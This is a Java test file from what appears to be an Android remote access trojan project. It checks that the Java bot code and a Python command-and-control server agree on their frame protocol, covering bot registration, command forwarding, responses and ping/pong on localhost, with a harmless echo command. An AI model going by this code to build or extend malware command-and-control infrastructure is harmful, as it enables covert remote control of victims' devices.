package com.darkbiit.rat;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Cross-implementation conformance check.
 *
 * Compiles the real RatProto/RatJson classes against a JVM (no Android
 * needed) and drives a full round trip through the Python C2 server:
 *
 *   1. the JVM "bot" registers on the data port           (RatProto.write)
 *   2. a controller asks the server to run a command       (control channel)
 *   3. the server forwards the COMMAND frame to the bot   (RatProto.read)
 *   4. the bot answers with a RESPONSE frame               (RatProto.write)
 *   5. the controller gets the result back
 *
 * If the Java and Python implementations disagree about the wire format, this
 * test fails at the first frame.
 *
 * Usage:
 *   java -cp <classes> com.darkbiit.rat.RatProtoConformance <dataHost> <dataPort> <secret> [controlHost] [controlPort]
 */
public final class RatProtoConformance {

    private RatProtoConformance() {
    }

    public static void main(String[] args) throws Exception {
        String host = args.length > 0 ? args[0] : "127.0.0.1";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 8777;
        String secret = args.length > 2 ? args[2] : "testsecret123";
        String ctrlHost = args.length > 3 ? args[3] : "127.0.0.1";
        int ctrlPort = args.length > 4 ? Integer.parseInt(args[4]) : 8778;

        Socket s = new Socket(host, port);
        s.setSoTimeout(0);
        OutputStream out = s.getOutputStream();
        InputStream in = s.getInputStream();

        Map<String, Object> reg = new LinkedHashMap<String, Object>();
        reg.put("secret", secret);
        reg.put("model", "java-conformance");
        reg.put("brand", "test");
        reg.put("android", "14");
        reg.put("sdk", 34);
        reg.put("package", "com.darkbiit.conformance");

        RatProto.write(out, RatProto.TYPE_REGISTER, RatJson.encode(reg).getBytes("UTF-8"));
        System.out.println("sent REGISTER");

        RatProto.Frame ack = RatProto.read(in);
        if (ack == null) {
            throw new IOException("no ack");
        }
        System.out.println("ack type=0x" + Integer.toHexString(ack.type & 0xff)
                + " payload=" + new String(ack.payload, "UTF-8"));
        if (ack.type != RatProto.TYPE_REGISTER_ACK) {
            throw new IOException("expected REGISTER_ACK");
        }
        String botId = RatJson.getString(RatJson.decodeObject(new String(ack.payload, "UTF-8")), "id", "");
        System.out.println("bot id = " + botId);

        // Controller thread: asks the server to run a command on this bot.
        final String[] result = new String[1];
        Thread controller = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    result[0] = control(ctrlHost, ctrlPort, botId);
                } catch (Exception e) {
                    result[0] = "CONTROL ERROR: " + e;
                }
            }
        });
        controller.start();

        // Bot side: answer the forwarded COMMAND frame.
        RatProto.Frame cmd = RatProto.read(in);
        if (cmd == null) {
            throw new IOException("server closed before sending a command");
        }
        System.out.println("command type=0x" + Integer.toHexString(cmd.type & 0xff));
        if (cmd.type != RatProto.TYPE_COMMAND) {
            throw new IOException("expected COMMAND, got 0x" + Integer.toHexString(cmd.type & 0xff));
        }
        String cmdJson = new String(cmd.payload, "UTF-8");
        System.out.println("command payload=" + cmdJson);

        Map<String, Object> req = RatJson.decodeObject(cmdJson);
        Map<String, Object> res = new LinkedHashMap<String, Object>();
        res.put("ok", Boolean.TRUE);
        res.put("id", RatJson.getString(req, "id", ""));
        res.put("cmd", RatJson.getString(req, "cmd", ""));
        res.put("echoed", RatJson.getString(req, "hello", ""));

        RatProto.write(out, RatProto.TYPE_RESPONSE, RatJson.encode(res).getBytes("UTF-8"));
        System.out.println("sent RESPONSE");

        // Ping/pong round trip.
        RatProto.write(out, RatProto.TYPE_PING, new byte[] { 1, 2, 3 });
        RatProto.Frame pong = RatProto.read(in);
        System.out.println("pong type=0x" + Integer.toHexString(pong.type & 0xff)
                + " len=" + pong.payload.length);
        if (pong.type != RatProto.TYPE_PONG) {
            throw new IOException("expected PONG");
        }

        controller.join(15000);
        System.out.println("controller result: " + result[0]);
        if (result[0] == null || result[0].contains("CONTROL ERROR")) {
            throw new IOException("control channel failed: " + result[0]);
        }

        s.close();
        System.out.println("CONFORMANCE OK");
    }

    /** Sends a control op and returns the raw reply line. */
    private static String control(String host, int port, String botId) throws IOException {
        Socket c = new Socket(host, port);
        c.setSoTimeout(0);
        try {
            Map<String, Object> req = new LinkedHashMap<String, Object>();
            req.put("op", "cmd");
            req.put("bot", botId);
            req.put("cmd", "echo");
            Map<String, Object> cargs = new LinkedHashMap<String, Object>();
            cargs.put("hello", "world");
            req.put("args", cargs);

            c.getOutputStream().write((RatJson.encode(req) + "\n").getBytes("UTF-8"));
            c.getOutputStream().flush();

            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream(), "UTF-8"));
            String line = r.readLine();
            if (line == null) {
                throw new IOException("control channel closed");
            }
            return line;
        } finally {
            c.close();
        }
    }
}
